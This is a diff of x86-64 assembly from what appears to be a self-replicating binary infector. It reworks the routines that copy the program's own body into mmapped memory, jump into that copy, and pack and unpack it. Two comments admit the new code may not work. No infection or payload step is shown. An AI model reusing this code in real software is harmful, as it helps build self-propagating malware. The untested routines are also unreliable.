@@ -102,67 +102,47 @@ _inject:
 		pop rax; mmap
 		syscall
 
-;		push rax
-;		pop rdi
-;		push rsi
-;		pop rdx
-;		mov rsi, r8
-;		call _ft_memcpy
-;		push rdx
-;		pop rsi
-		push rsi ; save length
+		push rsi; save length
 
+; ==
+;		memcpy(void *dst, void *src, size_t len)
 		push rax
-		pop rdi
-		lea rsi, [rel _start]; addr
+		pop rdi ; addr
+		lea rsi, [rel _start]
 		lea rdx, [rel _packed_part]
 		sub rdx, rsi
 		call _ft_memcpy
-		add rsi, rdx
-		mov r9, rdi
-
+; ==
+		mov r9, rdi; save addr
+;		unpack(void *dst, void *src, size_t len)
 		add rdi, rdx
-		pop rsi
-		lea rcx, [rel _end_of_pack]
-		lea r8, [rel _eof]
-		sub r8, rcx
-		mov rax, rsi
-		push rax
-		sub rsi, r8
-		lea rdx, [rel _packed_part]
-		sub rdx, rcx
-
+		add rsi, rdx
+		lea rdx, [rel _end_of_pack]
+		sub rdx, rsi
 		call _unpack
-
-		lea rax, [rel _packed_part]
-		add rsi, rax
-		lea rdi, [rel _start]
-		sub rsi, rdi
-		add rdi, rsi
-		lea rsi, [rel _end_of_pack]
+; ==
+;		memcpy(void *dst, void *src, size_t len)
+		add rdi, rdx
+		add rsi, rdx
 		lea rdx, [rel _eof]
 		sub rdx, rsi
 		call _ft_memcpy
 
-		mov r9, rdi
-
+		push r9
+		pop rdi
 		pop rsi
-		mov rdi, r9
-		
-;		push rsi
-;		pop rdx
 
-		pop rsi
 		pop r8
 		pop rdx
 
 		push rsi ; save length
-		push r9 ; save addr
 
 		lea rsi, [rel _start]
 		lea rax, [rel _search_dir]
 		sub rax, rsi
 		add rax, rdi
+
+		push rdi ; save addr
 
 		call rax ; jump to mmaped memory
 
@@ -174,55 +154,63 @@ _inject:
 		pop rax
 		syscall
 
-
 		jmp _end
 
-;                 v dst       v length   v src       v size
-_unpack:; (void *rdi, size_t rsi; void *rdx; size_t rcx)
+;                 v dst      v src       v size
+_unpack:; (void *rdi, void *rsi, size_t rdx)
 	push r8
 	push r9
 	push r10
 	push r11
-	push rbx
+	push rcx
 
-	xor r8, r8; i
-	xor r9, r9; j
+	push rdi
+	pop r9
+	push rsi
+	pop r10
+	push rdx
+	pop r11
+
+	xor rcx, rcx; i
+	xor r8, r8; j
 	.loop_uncompress:
-		cmp r8, rcx
+		xor rax, rax
+		cmp rcx, r11
 		jge .end_loop
-		cmp byte[rdx + r8], 17
+		cmp byte[r10 + rcx], 17
 		je .uncompress_char
-		mov al, [rdx + r8]
-		mov [rdi + r9], al
-		inc r9
-		inc r8
+			mov al, [r10 + rcx]
+			mov [r9 + r8], al
+			inc rcx
+			inc r8
+		jmp .loop_uncompress
 		.uncompress_char:
-		inc r8; i++
-		mov r10, rdi
-		mov r11, rsi
-		add rdi, r9; &dst[j]
-		mov rax, rsi
-		add rax, r8
-		mov rsi, rdi
-		xor rbx, rbx
-		mov bl, byte[rax]
-		sub rsi, rbx; &dst[j - src[i]]
-		push rdx
-		inc r8; i++
-		mov bl, byte[r11]
-		mov rdx, rbx
-		add rdx, r8; src[i]
-		call _ft_memcpy; memcpy(&dst[j], &dst[j - src[i - 1]], src[i])
-		add r9, [rdx]; j += src[i]
-		pop rdx
-		push r10
-		pop rdi
-		push r11
-		pop rsi
-		inc r8; i++
+; == TODO: Don't know if this works
+			inc rcx
+			mov rdi, r9
+			add rdi, r8
+			mov al, [r10 + rcx]
+			mov rsi, rdi
+			sub rsi, rax
+			inc rcx
+			mov al, [r10 + rcx]
+			mov rdx, rax
+			call _ft_memcpy
+			xor rax, rax
+			mov al, byte[r10 + rcx]
+			add r8, rax
+			inc rcx
+; ==
+		jmp .loop_uncompress
 	.end_loop:
+		push r9
+		pop rdi
+		push r10
+		pop rsi
+		push r11
+		pop rdx
 
-	pop rbx
+	pop rcx
 	pop r11
 	pop r10
 	pop r9
@@ -906,6 +894,7 @@ _end_host:
 	xor rdi, rdi; = 0
 	syscall
 
+; == TODO: Don't know if this works
 ;               v dest
 _pack: ;(void *rdi) -> ret size + fill rdi
 	push r8
@@ -1018,3 +1007,4 @@ _pack: ;(void *rdi) -> ret size + fill rdi
 	pop r9
 	pop r8
 ret
+; ==
